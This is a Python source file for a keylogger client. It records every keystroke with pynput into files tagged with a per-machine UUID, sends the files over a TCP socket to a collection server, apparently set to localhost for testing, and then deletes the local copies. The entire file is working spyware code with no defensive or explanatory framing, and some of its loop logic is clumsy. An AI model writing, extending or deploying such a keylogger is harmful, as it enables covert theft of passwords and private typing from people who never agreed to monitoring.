import os
import pynput
import socket
import time
import uuid
import configparser
import socket
import time


BUFFER_SIZE = 1024

COUNT = 1
#array with created keylogger file still existing
FILE = []

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 55556
CLIENT_CONFIG_FILE = "client_config.ini"
IP_CLIENT = None
configFile = configparser.ConfigParser()

def setID():
    clientID = str(uuid.uuid4())
    configFile['Client'] = {'ID': clientID}
    try:
        with open(CLIENT_CONFIG_FILE, 'w') as file:
            configFile.write(file)
    except IOError as e:
        print(f"An error occurred while writing: {e}")
    except Exception as e:
        print(f"An error occurred setting ID: {e}")
    print(f"[*] Assigned ID: {clientID}")
    return clientID


def getID():
    try:
        configFile.read(CLIENT_CONFIG_FILE)
        return configFile.get("Client", "ID")
    except (configparser.NoSectionError, configparser.NoOptionError, FileNotFoundError):
        return setID()


def deleteFile(nameFile):
    global FILE
    print("A file is going to be deleted..")
    try:
        os.remove(nameFile)
        FILE.pop(0)
        print(f"File '{nameFile}' has been deleted successfully\n")
    except FileNotFoundError:
        print(f"File '{nameFile}' has not been found")
    except Exception as e:
        print(f"An error occurred while deleting the file: {e}")

def sendFile(socket):
    global FILE
    print("A file is going to be sent to the server..")
    try:
        nameFile = FILE[0]
        with open(nameFile, 'rb') as f:
            fileToSent = f.read()
        socket.sendall(f"{nameFile}\n".encode() + fileToSent)
        print(f"The file '{nameFile}' has been sent to the server\n") 
        return nameFile    
    except Exception as e:
        print(f"An error occurred while sending file: {e}")



def connectionServer(s):
    try:
        id = getID().encode()
        s.sendall(id)
        data = s.recv(BUFFER_SIZE)
        print(f"Response from the SERVER : '{data.decode()}'\n")

        while True:
            nameFile = sendFile(s)
            data = s.recv(BUFFER_SIZE)
            print(f"Response from the SERVER : '{data.decode()}'\n")
            deleteFile(nameFile)
            return True
    except ConnectionRefusedError:
        print("Server not available. Retrying in 5 seconds..")
        time.sleep(5)
    except Exception as e:
        print(f"An error occurred while connected to server: {e}")
        return False
    
def writeFile30Sec():
    global COUNT
    global FILE
    start_time = time.time()
    elapsed_time = 0
    while elapsed_time < 30:  # 30 secondes
        file_name = f"{getID()}_{COUNT}.txt"
        FILE.append(file_name)
        COUNT += 1
        try:
            with open(file_name, 'w') as f:
                def on_press(key):
                    try:
                        f.write(key.char)
                    except AttributeError:
                        f.write(f"[{key}]")

                # Create the listener
                with pynput.keyboard.Listener(on_press=on_press) as listener:
                    time.sleep(1)  # Sleep for 1 second
                    elapsed_time = time.time() - start_time           
            
        except Exception as e:
            print(f"An error occurred during writing key logger: {e}")
            return False
    return True
    


def writeFile():
    global COUNT
    global FILE
    file_name = f"{getID()}_{COUNT}.txt"
    FILE.append(file_name)
    COUNT += 1
    try:
        with open(file_name, 'a') as f:
            def on_press(key):
                try:
                    f.write(key.char)
                except AttributeError:
                    f.write(f"[{key}]")

            # Create the listener
            with pynput.keyboard.Listener(on_press=on_press) as listener:
                while True:
                    time.sleep(1)  # Sleep for 1 second before attempting connection

                    try:
                        # Try to connect to the server
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.connect((SERVER_HOST, SERVER_PORT))
                            print("Connected to server")
                            return True  # Return True if connected successfully

                    except ConnectionRefusedError:
                        print("Server not reachable. Continuing to capture keystrokes.")
                    except Exception as e:
                        print(f"An error occurred during connection to server: {e}")

                listener.stop()  # Stop capturing keystrokes
                return False  # Return False if connection failed

    except Exception as e:
        print(f"An error occurred during writing key logger: {e}")
        return False


def main():
    global COUNT
    while True:
        if writeFile():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            connectionServer(s)
        if writeFile30Sec():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))
            COUNT -= 1
        
        else:
            print("Connection failed.")




if __name__ == "__main__":
    main()




